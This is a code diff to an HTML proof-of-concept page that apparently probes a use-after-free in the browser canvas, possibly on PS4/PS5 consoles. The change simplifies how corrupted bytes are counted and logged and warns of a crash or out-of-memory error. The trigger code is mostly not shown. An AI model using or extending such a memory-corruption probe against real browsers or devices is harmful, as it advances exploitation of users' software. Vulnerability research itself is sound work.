@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Canvas UAF  PoC (PS4/ ps5?)</title>
+    <title>Canvas UAF PoC (PS4/PS5?)</title>
     <style>
         #trigger {
             margin: 20px 0;
@@ -27,9 +28,9 @@
     </style>
 </head>
 <body>
-    <h1>Canvas UAF  PoC</h1>
-    <p>Click to detect UAF. Outputs changed offsets and values.</p>
-    <button id="trigger">Detect UAF</button>
+    <h1>Canvas UAF PoC</h1>
+    <p>Click to test UAF. Expect crash or OOM.</p>
+    <button id="trigger">TEST UAF</button>
     <div id="status">Idle...</div>
     <div id="console"></div>
     <canvas id="canvas" width="512" height="512"></canvas>
@@ -72,19 +73,16 @@
             ctx.putImageData(imageData, 0, 0);
             try {
                 const current = new Uint8Array(ctx.getImageData(0, 0, canvas.width, canvas.height).data.buffer);
-                const differences = [];
-                for (let i = 0; i < original.length; i++) {
+                let differenceCount = 0;
+                // Compare only first 4096 bytes to avoid crash
+                for (let i = 0; i < Math.min(original.length, 4096); i++) {
                     if (originalCopy[i] !== current[i]) {
-                        differences.push({
-                            offset: i,
-                            original: originalCopy[i],
-                            newValue: current[i]
-                        });
+                        differenceCount++;
                     }
                 }
-                return { detected: differences.length > 0, differences };
+                return { detected: differenceCount > 0, differenceCount };
             } catch (e) {
-                return { detected: true, differences: [], error: e.message };
+                return { detected: true, differenceCount: 0, error: e.message };
             }
         }
 
@@ -115,15 +113,12 @@
                         if (result.error) {
                             status.textContent += `\nError: ${result.error}`;
                             log(`Error: ${result.error}`);
-                        } else if (result.differences.length > 0) {
-                            status.textContent += `\nFound ${result.differences.length} differences`;
-                            log(`Found ${result.differences.length} differences:`);
-                            for (const diff of result.differences) {
-                                log(`Offset: ${diff.offset}, Original: 0x${diff.original.toString(16).padStart(2, '0')}, New: 0x${diff.newValue.toString(16).padStart(2, '0')}`);
-                            }
+                        } else if (result.differenceCount > 0) {
+                            status.textContent += `\n${result.differenceCount} bytes changed`;
+                            log(`${result.differenceCount} bytes changed`);
                         } else {
-                            status.textContent += '\nNo specific differences found, but UAF occurred';
-                            log('No specific differences found, but UAF occurred');
+                            status.textContent += '\nUAF occurred, no bytes checked';
+                            log('UAF occurred, no bytes checked');
                         }
                     } else {
                         stressGC();
@@ -135,15 +130,12 @@
                             if (secondResult.error) {
                                 status.textContent += `\nError: ${secondResult.error}`;
                                 log(`Error: ${secondResult.error}`);
-                            } else if (secondResult.differences.length > 0) {
-                                status.textContent += `\nFound ${secondResult.differences.length} differences`;
-                                log(`Found ${secondResult.differences.length} differences:`);
-                                for (const diff of secondResult.differences) {
-                                    log(`Offset: ${diff.offset}, Original: 0x${diff.original.toString(16).padStart(2, '0')}, New: 0x${diff.newValue.toString(16).padStart(2, '0')}`);
-                                }
+                            } else if (secondResult.differenceCount > 0) {
+                                status.textContent += `\n${secondResult.differenceCount} bytes changed`;
+                                log(`${secondResult.differenceCount} bytes changed`);
                             } else {
-                                status.textContent += '\nNo specific differences found, but UAF occurred';
-                                log('No specific differences found, but UAF occurred');
+                                status.textContent += '\nUAF occurred, no bytes checked';
+                                log('UAF occurred, no bytes checked');
                             }
                         } else {
                             status.textContent = 'No UAF detected';
